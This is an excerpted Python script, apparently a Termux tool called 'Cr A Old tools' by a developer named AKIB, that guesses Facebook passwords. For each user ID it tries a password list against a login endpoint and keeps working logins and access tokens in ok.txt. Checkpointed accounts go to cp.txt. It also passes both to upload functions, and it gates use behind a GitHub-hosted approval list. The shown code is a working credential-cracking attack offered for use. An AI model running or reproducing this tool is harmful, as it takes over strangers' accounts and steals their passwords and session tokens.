...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/akib.boyy.40s"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/akib.boyy.40s")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> 01837328672")
	subprocess.check_output(["am", "start", "https://wa.me/01837328672"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/AKIB1122/AKIB1122/main/Approve.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""\033[0;92m.d8888b.                      d8888  
\033[0;91md88P  Y88b                    d88888 
\033[0;92m888    888                   d88P888 
\033[0;93m888    888                   d88P888 
\033[0;94m888        888d888          d88P 888 
\033[0;95m888        888P"           d88P  888 
\033[0;96m888    888 888            d88P   888 
\033[0;97mY88b  d88P 888           d8888888888 
\033[0;98m "Y8888P"  888          d88P     888 

 > \033[0;92mDEVELOPER     : AKIB
 > \033[0;95mFACEBOOK ID   : Talhamul Akib 
 > \033[0;mWHATSAPP      : 01837328672    
    """)
		print("%s [%s•%s] %sTOOL NAME : %sCr A Old tools"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [CrA] : %s/%s -> \033[1;32m [CrA-OK:%s ]- \033[1;31m[CrA-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[CrA-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [CrA-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;31m[CrA-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [CrA-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
